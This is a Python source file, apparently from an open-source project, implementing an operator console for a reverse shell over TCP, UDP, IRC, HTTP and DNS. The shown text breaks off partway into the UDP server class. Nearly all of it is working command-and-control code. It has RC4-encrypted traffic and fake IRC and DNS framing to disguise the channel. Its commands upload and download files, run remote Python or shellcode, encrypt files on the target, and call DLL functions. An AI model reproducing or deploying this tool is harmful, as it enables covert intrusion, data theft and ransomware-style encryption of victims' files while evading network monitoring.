#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements an advanced reverse shell console.
#    Copyright (C) 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""

__version__ = "0.1.0"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This package implements an advanced reverse shell
console (supports: TCP, UDP, IRC, HTTP and DNS).
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/ReverseShell"

copyright = """
ReverseShell  Copyright (C) 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = [
    "ReverseShell",
    "IrcReverseShell",
    "DnsReverseShell",
    "HttpReverseShell",
    "ReverseShellUdp",
    "ReverseShellTcp",
    "ReverseShellSocketTcp",
    "main",
]

print(copyright)

from cmd import Cmd
from socket import socket
from sys import exit, stderr
from functools import partial
from re import compile as regex
from contextlib import suppress
from urllib.parse import urlparse
from random import randint, choices
from collections.abc import Callable
from json import JSONDecodeError, loads
from platform import system as platform
from string import ascii_letters, digits
from os.path import split, splitext, exists
from os import urandom, name, system as shell
from argparse import ArgumentParser, Namespace
from typing import TypeVar, List, Dict, Tuple, Union
from bz2 import compress as bz2, decompress as unbz2
from gzip import compress as gzip, decompress as ungzip
from lzma import compress as lzma, decompress as unlzma
from zlib import compress as zlib, decompress as unzlib
from ssl import SSLContext, PROTOCOL_TLS_SERVER, SSLWantReadError
from socketserver import BaseRequestHandler, UDPServer, TCPServer
from shlex import split as shellsplit, join as shelljoin, quote as shellquote
from base64 import (
    b85decode,
    b85encode,
    b64encode,
    b64decode,
    b32encode,
    b32decode,
    b16encode,
    b16decode,
)

from PythonToolsKit.Encodings import decode_data
from PythonToolsKit.PrintF import printf

Json = TypeVar("Json", dict, list, str, int, float, bool)
alphanum: bytes = ascii_letters.encode() + b"_" + digits.encode()
letters: bytes = ascii_letters.encode()

base64regex = regex(
    r"^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$"
)


def is_filepath(filename: str, is_windows: bool = None) -> Union[bool, None]:
    """
    This function checks filename validity.

    >>> is_filepath('abc', True)
    True
    >>> is_filepath(r'C:\\abc\\test.txt', True)
    True
    >>> is_filepath('/abc/test.txt', False)
    True
    >>> is_filepath(r'<abc>|*/\\"', True)
    False
    >>> print(is_filepath('/abc,/<>', False))
    None
    >>>
    """

    if (
        is_windows
        and any(x in filename for x in '"<>|*?')
        or ":" == filename[0]
        or ":" in filename[2:]
    ):
        return False
    elif any(
        x not in "0123456789abcdefghijklmnopqrstuvwx"
        "yzABCDEFGHIJKLMNOPQRSTUVWXYZ-./_\\:"
        for x in filename
    ):
        return None

    return True


def confirm(message: str) -> bool:
    """
    This function asks to continue.
    """

    printf(
        message + " [Y/N/y/n/yes/no/YES/NO] : ",
        state="ASK",
        end="",
    )
    response = input().casefold()
    while response not in ("y", "n", "yes", "no"):
        printf(
            message + " [Y/N/y/n/yes/no/YES/NO] : ",
            state="ASK",
            end="",
        )
        response = input().casefold()

    if response in ("y", "yes"):
        return True
    return False


class ReverseShell(Cmd, BaseRequestHandler):

    """
    This class implements a reverse shell command line.

    key: if is not None decrypt received data and encrypt
    data to send with the key.
    """

    _set: bool = False
    color: bool = True
    prompt: str = "~$ "
    files: List[str] = []
    use_timeout: bool = True
    target_system: str = None
    executables: List[str] = []
    target_is_windows: bool = None
    is_windows: bool = name == "nt"
    encoding: str = "utf-8" if name != "nt" else "cp437"
    decode: Callable = lambda x, y: y
    decompress: Callable = decode
    encode: Callable = decode
    compress: Callable = decode

    def __init__(
        self,
        *args,
        key: bytes = None,
        encoding: str = None,
    ):
        self.encoding = encoding or self.encoding
        self.key = getattr(self, "key", None) or key and self.init_key(key)
        Cmd.__init__(self)
        BaseRequestHandler.__init__(self, *args)

    def recv(self) -> bytes:
        """
        This method gets all packets sent.
        """

        data = self.sock.recv(65535)
        if self.use_timeout:
            self.sock.settimeout(0.5)
        else:
            self.sock.setblocking(False)

        while True:
            try:
                data += self.sock.recv(65535)
            except (BlockingIOError, SSLWantReadError, TimeoutError):
                break

        self.sock.setblocking(True)
        return data

    def handle(self) -> None:
        """
        This methods gets TCP data and send it.
        """

        request = self.request
        self.default_sender = True
        if isinstance(request, tuple):
            sock = self.sock = request[1]
            data = request[0]
            self.sender = lambda x: sock.sendto(x, self.client_address)
        else:
            sock = self.sock = request
            data = self.recv()
            self.sender = self.request.sendall

        data = self.parse_data(data)

        if data:
            self.use_data(data)
            self.__class__.use_data = self.__class__.default_use_data
            self.cmdloop()

    def use_data(self, data: str):
        """
        This function uses received data and should be overwritten for
        custom behaviour in builtins commands.
        """

        print(data)

    default_use_data = use_data

    def defined_context(self, data: Dict[str, Json]) -> None:
        """
        This function sets context.
        """

        self.__class__.hostname = hostname = data.get(
            "hostname", getattr(self, "hostname", self.client_address[0])
        )
        self.__class__.user = user = data.get(
            "user", getattr(self, "user", "user")
        )
        self.__class__.current_directory = cwd = data.get(
            "cwd", getattr(self, "current_directory", "~")
        )
        self.__class__.target_system = system = data.get(
            "system", getattr(self, "target_system", platform())
        )
        self.__class__.target_is_windows = is_windows = (
            system.casefold() == "windows"
        )
        encoding = data.get("encoding")
        compression = data.get("commpression")

        if (
            encoding
            and encoding.startswith("base")
            and encoding[-2:].isdigit()
        ):
            globals_ = globals()
            decode = globals_["b" + encoding[-2:] + "decode"]
            encode = globals_["b" + encoding[-2:] + "encode"]
            self.__class__.decode = lambda x, y: decode(y)
            self.__class__.encode = lambda x, y: encode(y)

        if compression in ("gzip", "lzma", "zlib", "bz2"):
            globals_ = globals()
            compress = globals_[compression]
            decompress = globals_["un" + compression]
            self.__class__.compress = lambda x, y: compress(y)
            self.__class__.decompress = lambda x, y: decompress(y)

        key = self.decompress(self.decode(data.get("key", "").encode()))

        if key and self.key:
            key_base = self.key
            key_length = len(self.key)
            del self.key
            self.__class__.key = bytes(
                [key_base[i % key_length] ^ char for i, char in enumerate(key)]
            )

        if is_windows:
            self.__class__.encoding = "cp437"
        else:
            self.__class__.encoding = "utf-8"

        ReverseShell.prompt = (
            (
                "\x1b[48;2;50;50;50m"
                f"\x1b[38;2;37;161;127m{hostname}\x1b[39m@"
                f"\x1b[38;2;47;99;161m{user}\x1b[39m:"
                f"\x1b[38;2;246;172;56m{cwd}\x1b[39m$ "
            )
            if self.color
            else f"{hostname}@{user}:{cwd}$ "
        )

        self.__class__.executables = executables = data.get(
            "executables", getattr(self, "executables", self.executables)
        )
        self.__class__.files = files = data.get(
            "files", getattr(self, "files", self.files)
        )
        ReverseShell._set = True

        if not is_windows:
            return None

        for name, list_ in {
            "executables": executables,
            "files": files,
        }.items():
            final_list = []
            for element in list_:
                element = element.casefold()
                final_list.append(element)
                final_list.append(splitext(element)[0])
            setattr(self.__class__, name, final_list)

    def parse_data(self, data: bytes) -> str:
        """
        This function parses TCP data.
        """

        if self.key:
            data = self.encrypt(data, decrypt=True)

        if data[0] == 1:
            try:
                data = loads(data[1:])
            except JSONDecodeError:
                pass
            else:
                self.defined_context(data)
                self.default("\x06", False)
                return b""

        if not self._set:
            self.prompt = self.client_address[0] + "~$ "

        try:
            return data.decode(self.encoding)
        except UnicodeDecodeError:
            return decode_data(data)

    def completenames(
        self, text: str, line: str, begidx: int, endidx: int
    ) -> List[str]:
        """
        This function returns the default list for completion.
        """

        startfilename = shellsplit(line)[-1]
        return [
            x
            for x in self.executables
            + self.files
            + ["./" + f for f in self.files]
            if x.startswith(startfilename)
        ]

    completedefault = completenames

    def default(self, argument: str, check: bool = True) -> None:
        """
        This method sends data to socket shell client.
        """

        command_splitted = shellsplit(argument)
        if (
            check
            and command_splitted
            and self.executables
            and split(command_splitted[0])[1] == command_splitted[0]
            and (
                (
                    self.target_is_windows
                    and command_splitted[0].casefold()
                    not in (
                        "quit",
                        "exit",
                        "cls",
                        "dir",
                        "copy",
                        "move",
                        "if",
                        "echo",
                        "for",
                        "type",
                        # "install_agent",
                        "python3_exec_file",
                        "python3_exec_file_compress",
                        *self.executables,
                        *self.files,
                    )
                )
                or (
                    not self.target_is_windows
                    and command_splitted[0]
                    not in (
                        "quit",
                        "exit",
                        "clear",
                        "if",
                        "then",
                        "else",
                        "elif",
                        "fi",
                        "case",
                        "esac",
                        "for",
                        "select",
                        "while",
                        "until",
                        "do",
                        "done",
                        "in",
                        "function",
                        "time",
                        "{",
                        "}",
                        "!",
                        "[[",
                        "]]",
                        "coproc",
                        "compgen",
                        # "install_agent",
                        "python3_exec_file_compress",
                        *self.executables,
                        *self.files,
                    )
                )
            )
        ):
            if not confirm(
                "Executable not found, are you sure you want send it ?"
            ):
                self.cmdloop()
                return None

        if self.key:
            data = self.encrypt(argument.encode(self.encoding))
        else:
            data = argument.encode(self.encoding)

        self.sender(data)

    def postcmd(self, stop: bool, line: str) -> bool:
        """
        This function stop the cmdloop for each packet sended.
        """

        if line.strip():
            return True
        else:
            return False

    if is_windows:

        def do_cls(self, argument: str) -> bool:
            """
            This method clear console on windows.
            """

            shell("cls")
            self.cmdloop()
            return None

    else:

        def do_clear(self, argument: str) -> bool:
            """
            This method clear console on windows.
            """

            shell("clear")
            self.cmdloop()
            return None

    # def do_install_agent(self, arguments: str) -> bool:
    #     """
    #     This method executes a python file to install
    #     an agent on the target.
    #     """

    #     from ShellClients import get_commands_install

    #     self.default(";".join(get_commands_install(split(arguments))))
    #     return False

    def do_cd(self, argument: str) -> bool:
        """
        This method quits the reverse shell.
        """

        # arguments = shellsplit(argument)
        # if len(arguments) > 1:
        #     command = shelljoin(["cd", argument])
        #     command_repr = repr(command)
        #     printf(
        #         "Invalid command detected for 'cd' command.",
        #         state="ERROR",
        #         file=stderr,
        #     )
        #     printf("Do you want to send: " + command_repr + " ?", state="ASK")
        #     response = ""
        #     while response.casefold() not in ("yes", "y", "n", "no"):
        #         response = input(
        #             "[YES/yes/y/Y]: to send the new command ("
        #             + command_repr
        #             + "), [NO/no/n/N]: don't send the command: "
        #         )
        #     if response in ("yes", "y"):
        #         self.default(command)
        #     else:
        #         self.cmdloop()
        # elif len(arguments) < 1:
        #     printf(
        #         "Invalid command detected for 'cd' command."
        #         " First argument is required.",
        #         state="ERROR",
        #         file=stderr,
        #     )
        #     self.cmdloop()
        if not len(argument):
            printf(
                "Invalid command detected for 'cd' command."
                " First argument is required.",
                state="ERROR",
                file=stderr,
            )
            printf(
                "USAGE: cd raw directory path",
                state="INFO",
                file=stderr,
            )
            self.cmdloop()
        elif is_filepath(argument, self.target_is_windows) is False:
            printf(
                "Invalid directory path detected for 'cd' command.",
                state="ERROR",
                file=stderr,
            )
            self.cmdloop()
        elif is_filepath(argument, self.target_is_windows) is None:
            printf(
                "Probably invalid directory path detected for 'cd'"
                " command. This is not a shell syntax all characters after "
                "'cd ' string is the raw directory path.",
                state="NOK",
                file=stderr,
            )
            if not confirm(
                "Are you sure this is the directory "
                "path, do you want to send it ?"
            ):
                self.cmdloop()
            else:
                self.default("cd " + argument)
        else:
            self.default("cd " + argument)
        return False

    def do_upload_file(self, argument: str, compress: bool = False) -> bool:
        """
        This method uploads a file on the target.
        """

        send = False
        arguments = shellsplit(argument)
        if len(arguments) != 2:
            printf(
                "Invalid command detected for 'upload_file' command."
                " First and second are required.",
                state="ERROR",
                file=stderr,
            )
            printf(
                "USAGE: upload_file [source filename] [destination filename]",
                state="INFO",
                file=stderr,
            )
            self.cmdloop()
        elif (
            is_filepath(arguments[1], self.target_is_windows) is False
            or is_filepath(arguments[0], self.is_windows) is False
        ):
            printf(
                "Invalid filename detected for 'upload_file' command.",
                state="ERROR",
                file=stderr,
            )
            self.cmdloop()
        elif not exists(arguments[0]):
            printf(
                "Source file not found for 'upload_file' command.",
                state="ERROR",
                file=stderr,
            )
            self.cmdloop()
        elif is_filepath(arguments[1], self.target_is_windows) is None:
            printf(
                "Probably invalid filename detected for "
                "'upload_file' command.",
                state="NOK",
                file=stderr,
            )
            if not confirm(
                "Are you sure this is the filename, do you want to send it ?"
            ):
                self.cmdloop()
            else:
                send = True
        else:
            send = True

        if not send:
            return False

        file = open(arguments[0], "rb")
        if compress:
            data = self.encode(self.compress(file.read()))
        else:
            data = self.encode(file.read())
        file.close()
        self.default(
            "upload_file"
            + ("_compress " if compress else " ")
            + shellquote(arguments[1])
            + " "
            + data.decode("latin-1")
        )
        return False

    def do_upload_file_compress(self, argument: str) -> bool:
        """
        This method uploads a compressed file on the target.
        """

        return self.do_upload_file(argument, True)

    def use_data_download(self, data: str) -> None:
        """
        This method is used for download file commands.
        """

        with open(self.download_filename, "wb") as file:
            file.write(self.decode(data.encode()))

        print("done")

    def do_download_file(self, argument: str, compress: bool = False) -> bool:
        """
        This method quits the reverse shell.
        """

        send = False
        if not len(argument):
            printf(
                "Invalid command detected for 'download_file' command."
                " Arguments are required.",
                state="ERROR",
                file=stderr,
            )
            printf(
                "USAGE: download_file raw filename", state="INFO", file=stderr
            )
            self.cmdloop()
        elif is_filepath(argument, self.target_is_windows) is False:
            printf(
                "Invalid filename detected for 'download_file' command.",
                state="ERROR",
                file=stderr,
            )
            self.cmdloop()
        elif is_filepath(argument, self.target_is_windows) is None:
            printf(
                "Probably invalid filename detected for 'download_file'"
                " command. This is not a shell syntax all characters after "
                "'download_file ' string is the raw filename.",
                state="NOK",
                file=stderr,
            )
            if not confirm(
                "Are you sure this is the filename, do you want to send it ?"
            ):
                self.cmdloop()
            else:
                send = True
        else:
            send = True

        self.__class__.download_filename = argument
        self.__class__.use_data = self.__class__.use_data_download
        if send and compress:
            self.default("download_file_compress " + argument)
        elif send:
            self.default("download_file " + argument)
        return False

    def do_download_url(self, argument: str) -> bool:
        """
        This method quits the reverse shell.
        """

        arguments = shellsplit(argument)
        arguments_length = len(arguments)
        url = arguments_length and urlparse(arguments[0])
        send = False
        if arguments_length != 1 and arguments_length != 2:
            printf(
                "Invalid command detected for 'download_url' command."
                " Arguments are required.",
                state="ERROR",
                file=stderr,
            )
            printf(
                "USAGE: download_url [URL] (optional:filename)",
                state="INFO",
                file=stderr,
            )
            self.cmdloop()
        elif not url.netloc or not url.scheme:
            printf(
                "Invalid URL detected for 'download_url' command.",
                state="ERROR",
                file=stderr,
            )
            self.cmdloop()
        elif (
            arguments_length == 2
            and is_filepath(arguments[1], self.target_is_windows) is False
        ):
            printf(
                "Invalid filename detected for 'download_url' command.",
                state="ERROR",
                file=stderr,
            )
            self.cmdloop()
        elif (
            arguments_length == 2
            and is_filepath(arguments[1], self.target_is_windows) is None
        ):
            printf(
                "Probably invalid filename detected for 'download_url'"
                " command.",
                state="NOK",
                file=stderr,
            )
            if not confirm(
                "Are you sure this is the filename, do you want to send it ?"
            ):
                self.cmdloop()
            else:
                send = True
        else:
            send = True

        if send:
            self.default(shelljoin(("download_url", *arguments)))

        return False

    def do_download_file_compress(self, argument: str) -> bool:
        """
        This method quits the reverse shell.
        """

        return self.do_download_file(argument, True)

    def do_python3_exec(self, argument: str, compress: bool = False) -> bool:
        """
        This method quits the reverse shell.
        """

        if len(argument):
            if compress:
                self.default(
                    "python3_exec_compress "
                    + self.encode(self.compress(argument.encode())).decode()
                )
            else:
                self.default("python3_exec " + argument)
        else:
            printf(
                "Invalid command detected for 'python3_exec' command."
                " Arguments are required.",
                state="ERROR",
                file=stderr,
            )
            printf(
                "USAGE: python3_exec raw python code",
                state="INFO",
                file=stderr,
            )
            self.cmdloop()
        return False

    def do_python3_exec_file(
        self, argument: str, compress: bool = False
    ) -> bool:
        """
        This method quits the reverse shell.
        """

        if exists(argument):
            if compress:
                file = open(argument, "rb")
                script = self.encode(self.compress(file.read())).decode(
                    "latin-1"
                )
            else:
                file = open(argument, "r", encoding="latin-1")
                script = file.read()
            file.close()
            self.default(
                "python3_exec" + ("_compress " if compress else " ") + script
            )
        elif not len(argument):
            printf(
                "Invalid command detected for 'python3_exec_file' command."
                " First argument is required.",
                state="ERROR",
                file=stderr,
            )
            printf(
                "USAGE: python3_exec_file [python script filename]",
                state="INFO",
                file=stderr,
            )
            self.cmdloop()
        else:
            printf(
                "Source file not found for 'python3_exec_file' command. "
                "Arguments are a raw filename this is not a shell systax",
                state="ERROR",
                file=stderr,
            )
            self.cmdloop()
        return False

    def do_python3_exec_compress(self, argument: str) -> bool:
        """
        This method quits the reverse shell.
        """

        return self.do_python3_exec(argument, True)

    def do_python3_exec_file_compress(self, argument: str) -> bool:
        """
        This method quits the reverse shell.
        """

        return self.do_python3_exec_file(argument, True)

    def do_shellcode(self, argument: str, compress: bool = False) -> bool:
        """
        This method quits the reverse shell.
        """

        if not len(argument):
            printf(
                "Invalid command detected for 'shellcode' command."
                " First argument is required.",
                state="ERROR",
                file=stderr,
            )
            printf(
                "USAGE: shellcode [shellcode base64-encoded]",
                state="INFO",
                file=stderr,
            )
            self.cmdloop()
        elif base64regex.match(argument) is None:
            printf(
                "Invalid syntax detected for 'shellcode' command."
                " Shellcode (first argument) must be base64-encoded.",
                state="ERROR",
                file=stderr,
            )
            printf(
                "USAGE: shellcode [shellcode base64-encoded]",
                state="INFO",
                file=stderr,
            )
            self.cmdloop()
        else:
            if compress:
                self.default(
                    "shellcode_compress "
                    + self.encode(
                        self.compress(b64decode(argument.encode()))
                    ).decode()
                )
            else:
                self.default(
                    "shellcode "
                    + self.encode(b64decode(argument.encode())).decode()
                )
        return False

    def do_shellcode_compress(self, argument: str) -> bool:
        """
        This method quits the reverse shell.
        """

        return self.do_shellcode(argument, True)

    def do_encrypt_files(
        self, argument: str, onefile: bool = False, decrypt: bool = False
    ) -> bool:
        """
        This method quits the reverse shell.
        """

        send = False
        arguments = shellsplit(argument)
        if len(arguments) < 2:
            printf(
                "Invalid command detected for 'encrypt_files' command."
                " Minimum 2 arguments are required.",
                state="ERROR",
                file=stderr,
            )
            printf(
                "USAGE: encrypt_files [key] [filename1] "
                "[filename2] ... [filenameX]",
                state="INFO",
                file=stderr,
            )
            self.cmdloop()
        elif onefile and len(arguments) != 2:
            printf(
                "Invalid command detected for 'encrypt_file' command."
                " Only 2 arguments are required.",
                state="ERROR",
                file=stderr,
            )
            printf(
                "USAGE: encrypt_file [key] [filename]",
                state="INFO",
                file=stderr,
            )
            self.cmdloop()
        elif (
            onefile
            and is_filepath(arguments[1], self.target_is_windows) is False
        ):
            printf(
                "Invalid filename detected for 'encrypt_file' command.",
                state="ERROR",
                file=stderr,
            )
            self.cmdloop()
        elif (
            onefile
            and is_filepath(arguments[1], self.target_is_windows) is None
        ):
            printf(
                "Probably invalid filename detected for "
                "'encrypt_file' command.",
                state="NOK",
                file=stderr,
            )
            if not confirm(
                "Are you sure this is the filename, do you want to send it ?"
            ):
                self.cmdloop()
            else:
                send = True
        else:
            send = True

        if send and onefile:
            self.default(
                ("decrypt" if decrypt else "encrypt") + "_file " + argument
            )
        elif send:
            self.default(
                ("decrypt" if decrypt else "encrypt") + "_files " + argument
            )
        return False

    def do_encrypt_file(self, argument: str) -> bool:
        """
        This method quits the reverse shell.
        """

        return self.do_encrypt_files(argument, True)

    def do_decrypt_files(self, argument: str) -> bool:
        """
        This method quits the reverse shell.
        """

        return self.do_encrypt_files(argument, False, True)

    def do_decrypt_file(self, argument: str) -> bool:
        """
        This method quits the reverse shell.
        """

        return self.do_encrypt_files(argument, True, True)

    def do_archive_files(self, argument: str) -> bool:
        """
        This method sends command to archive files from multiples glob syntax.
        """

        arguments = shellsplit(argument)
        arguments_length = len(arguments)
        archive_name = arguments_length and arguments[0]
        if arguments_length > 1 and any(
            archive_name.endswith(x)
            for x in (".zip", ".tar", ".tar.gz", ".tar.bz2", ".tar.xz")
        ):
            self.default("archive_files " + argument)
        elif arguments_length > 1:
            printf(
                "Invalid extension for archive name. Extension must be: "
                "'.zip', '.tar', '.tar.gz', '.tar.bz2' or '.tar.xz'",
                state="ERROR",
                file=stderr,
            )
            self.cmdloop()
        else:
            printf(
                "Invalid command detected for 'archive_files' command."
                " Arguments are required.",
                state="ERROR",
                file=stderr,
            )
            printf(
                "USAGE: archive_files [archive name] [match file 1] "
                "[match file 2] ... [match file N]",
                state="INFO",
                file=stderr,
            )
            self.cmdloop()

        return False

    def do_call_library_function(self, argument: str) -> bool:
        """
        This method sends command to calls DLL function.
        """

        c_types = [
            "bool:",
            "byte:",
            "char:",
            "char *:",
            "double:",
            "float:",
            "long:",
            "long long:",
            "short:",
            "unsigned byte:",
            "unsigned long:",
            "unsigned long long:",
            "unsigned short:",
            "void *:",
            "wchar:",
            "wchar *:",
        ]

        arguments = shellsplit(argument)
        if len(arguments) < 2:
            printf(
                "Invalid command detected for 'call_library_function' command."
                " Minimum 2 arguments are required.",
                state="ERROR",
                file=stderr,
            )
            printf(
                "USAGE: call_library_function [DLL name or path] "
                "[function] [argument1 type:value] [argument2 type:value]"
                " ... [argumentN type:value]",
                state="INFO",
                file=stderr,
            )
            self.cmdloop()
        elif any(
            not any(x.startswith(t) for t in c_types) for x in arguments[2:]
        ):
            printf(
                "Invalid argument type detected."
                " Function arguments must be in this format: 'type:value'."
                " Where type must be in: "
                + ", ".join(repr(t)[:-1] for t in c_types),
                state="ERROR",
                file=stderr,
            )
            self.cmdloop()
        else:
            self.default("call_library_function " + argument)
        return False

    def do_quit(self, argument: str) -> bool:
        """
        This method quits the reverse shell.
        """

        return True

    def do_exit(self, argument: str) -> bool:
        """
        This method exits the reverse shell.
        """

        return True

    def init_key(self, key_text: bytes) -> bytes:
        """
        This method sets RC4 key.
        """

        key = self.key = bytearray(range(256))
        j = 0

        for i in range(256):
            j = (j + key[i] + key_text[i % len(key_text)]) % 256
            key[i], key[j] = key[j], key[i]

        return key

    def encrypt(self, data: bytes, decrypt: bool = False) -> bytes:
        """
        This method encrypts/decrypts data with RC4.
        """

        if decrypt:
            iv = data[:256]
            data = data[256:]
        else:
            iv = urandom(256)

        i = j = 0
        encrypted = bytearray()
        key = [iv[i] ^ char for i, char in enumerate(self.key)]

        for char in data:
            i = (i + 1) % 256
            j = (j + key[i]) % 256
            key[i], key[j] = key[j], key[i]
            encrypted.append(char ^ key[(key[i] + key[j]) % 256])

        if decrypt:
            return bytes(encrypted)
        return iv + bytes(encrypted)


class IrcReverseShell(ReverseShell):

    """
    This class implements a fake IRC server for a reverse shell.
    """

    @staticmethod
    def random_message() -> bytes:
        """
        This method generates a random message.
        """

        msg = b""
        for a in range(randint(2, 8)):
            msg += bytes(choices(letters, k=randint(1, 10))) + b" "
        return msg[:-1]

    def parse_data_step0(self, data: bytes) -> str:
        """
        This method parses the USER IRC command (first packet
        for IRC initialization).
        """

        def random_domain() -> bytes:
            return (
                b"*"  # wildcard syntax for subdomain
                + b"."
                + bytes(choices(alphanum, k=randint(1, 10)))
                + b"."
                + bytes(choices(letters, k=randint(1, 10)))
            )

        if len(data) > 5 and data.startswith(b"USER "):
            splitted_data = data.split(maxsplit=4)
            if len(splitted_data) == 5:
                (
                    _,
                    self.user,
                    self.hostname,
                    self.servername,
                    self.description,
                ) = splitted_data
                self.user = self.user.decode()
                self.hostname = self.hostname.decode()
                self.description = self.description.strip().decode()
                ReverseShell.prompt = (
                    f"{self.hostname}@{self.user}{self.description}$ "
                )
                self.random_domain = random_domain()
                self.__class__.parse_data = self.parse_data_step1
                self.sender(
                    b":"
                    + self.random_domain
                    + b" NOTICE * :"
                    + self.random_message()
                    + b"\r\n"
                )

        return ""

    def parse_data_step1(self, data: bytes) -> str:
        """
        This method parses the NICK IRC command (second packet
        for IRC initialization).
        """

        if len(data) > 5 and data.startswith(b"NICK "):
            self.nickname = data[5:].strip()
            self.__class__.parse_data = self.parse_data_step2
            self.sender(
                b":"
                + self.random_domain
                + b" NOTICE * :"
                + self.random_message()
                + b"\r\n"
            )
            return ""

        self.__class__.parse_data = self.parse_data_step0
        return ""

    def parse_data_step2(self, data: bytes) -> str:
        """
        This method parses the JOIN IRC command (third packet
        for IRC initialization).
        """

        if len(data) > 6 and data.startswith(b"JOIN #"):
            channels = data[5:].strip()
            self.__class__.channels = channels.split(b",")
            self.sender(b":" + self.nickname + b" JOIN :" + channels + b"\r\n")
            self.ping = bytes(choices(alphanum, k=randint(1, 10)))
            self.__class__.parse_data = self.parse_data_step3
            self.sender(b"PING :" + self.ping + b"\r\n")
            return ""

        self.__class__.parse_data = self.parse_data_step0
        return ""

    def parse_data_step3(self, data: bytes) -> str:
        """
        This method parses the JOIN IRC command (third packet
        for IRC initialization).
        """

        if data.startswith(b"PONG :"):
            if self.ping == data[6:].strip():
                self.__class__.parse_data = self.parse_data_step4
                self.sender(
                    b":"
                    + self.random_domain
                    + b" NOTICE "
                    + self.nickname
                    + b" :"
                    + self.random_message()
                    + b"\r\n"
                )
                return ""

        self.__class__.parse_data = self.parse_data_step0
        return ""

    def parse_data_step4(self, data: bytes) -> str:
        """
        This method parses the PRIVMSG IRC packets used for reverse shell.
        """

        if len(data) > 9 and data.startswith(b"PRIVMSG #"):
            splitted_data = data.split()
            if len(splitted_data) == 3 and splitted_data[1] in self.channels:
                return super().parse_data(b64decode(splitted_data[2][1:]))

        self.__class__.parse_data = self.parse_data_step0
        return ""

    def default(self, data: str, *args, **kwargs) -> None:
        """
        This method generates IRC response.
        """

        if self.default_sender:
            self.username = getattr(self, "username", None) or bytes(
                choices(alphanum, k=randint(4, 10))
            )

            sender = self.sender
            self.sender = lambda x: sender(
                b":"
                + self.username
                + b" PRIVMSG "
                + self.channels[0]
                + b" :"
                + b64encode(x)
                + b"\r\n"
            )
            self.default_sender = False

        super().default(data, *args, **kwargs)

    parse_data = parse_data_step0


class DnsReverseShell(ReverseShell):

    """
    This class implements a reverse shell using DNS (UDP).
    """

    def parse_data(self, data: bytes) -> str:
        """
        This method parses DNS requests.
        """

        self.dns_id = data[:2]
        query = data[12:].split(b"\x00")[0]
        data = bytearray()

        while query:
            length = query[0] + 1
            data += b16decode(query[1:length])
            query = query[length:]

        return super().parse_data(data)

    def default(self, data: str, *args, **kwargs) -> None:
        """
        This method generates HTTP response.
        """

        def generate_query(data: bytes) -> bytes:
            first = data[:5]
            query = bytearray()
            query.append(len(first) * 2)
            query += b16encode(first)
            data = data[5:]
            while len(data) > 50:
                length = randint(10, 50)
                query += (length * 2).to_bytes(1) + b16encode(data[:length])
                data = data[length:]
            if data:
                query += (len(data) * 2).to_bytes(
                    1, byteorder="big"
                ) + b16encode(data)
            query += (
                b"\x00\x00\x01\x00\x01\xc0\x0c\x00\x01\x00\x01"
                + randint(0, 2147483647).to_bytes(4, "big")
                + b"\x00\x04"
                + randint(0, 2147483647).to_bytes(4, "big")
            )
            return query

        if self.default_sender:
            sender = self.sender
            self.sender = lambda x: sender(
                self.dns_id
                + b"\x80\x00\x00\x01\x00\x01\x00\x00\x00\x00"
                + generate_query(x)
            )
            self.default_sender = False

        super().default(data, *args, **kwargs)


class HttpReverseShell(ReverseShell):

    """
    This class implements a reverse shell using HTTP.
    """

    def parse_data(self, data: bytes) -> str:
        """
        This method parses HTTP requests.
        """

        return super().parse_data(data.split(b"\r\n\r\n", 1)[1])

    def default(self, data: str, *args, **kwargs) -> None:
        """
        This method generates HTTP response.
        """

        if self.default_sender:
            sender = self.sender
            self.sender = lambda x: sender(
                b"HTTP/1.0 200 OK\r\nContent-Type: {type}\r\n".replace(
                    b"{type}",
                    b"octect/stream"
                    if self.key
                    else b"text/plain; charset=utf-8",
                )
                + b"Content-Length: {length}\r\n\r\n".replace(
                    b"{length}", str(len(x)).encode()
                )
                + x
            )
            self.default_sender = False

        super().default(data, *args, **kwargs)


class ReverseShellTcp(TCPServer):

    """
    This class implements TCP server with ssl.
    """

    def __init__(
        self,
        address: Tuple[str, int] = ("0.0.0.0", 1337),
        handler: type = ReverseShell,
        ssl: bool = False,
        cert: str = "server.crt",
        key: str = "server.key",
    ):
        super().__init__(address, handler)
        self.certfile = cert
        self.keyfile = key
        self.ssl = ssl

    def get_request(self):
        """
        This method sets SSL encryption for new connection.
        """

        socket, address = super().get_request()
        if self.ssl:
            context = SSLContext(PROTOCOL_TLS_SERVER)
            context.load_cert_chain(self.certfile, self.keyfile)
            socket = context.wrap_socket(
                socket,
                server_side=True,
            )

        return socket, address


class ReverseShellSocketTcp:

    """
    This class implements a one-socket TCP server.
    """

    def __init__(
        self,
        address: Tuple[str, int] = ("0.0.0.0", 1337),
        handler: type = ReverseShell,
        ssl: bool = False,
        cert: str = "server.crt",
        key: str = "server.key",
    ):
        self.server_address = address
        self.handler = handler
        self.certfile = cert
        self.keyfile = key
        self.ssl = ssl

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.run = False
        self.request.close()

    def serve_forever(self):
        """
        This method starts the socket of the reverse shell server.
        """

        sock = self.request = socket()
        sock.bind(self.server_address)
        sock.listen(1)
        request, client_address = sock.accept()
        self.run = True

        if self.ssl:
            context = SSLContext(PROTOCOL_TLS_SERVER)
            context.load_cert_chain(self.certfile, self.keyfile)
            request = context.wrap_socket(
                request,
                server_side=True,
                certfile=self.certfile,
                keyfile=self.keyfile,
            )

        while self.run:
            self.handler(request, client_address, self)


class ReverseShellUdp(UDPServer):

    """
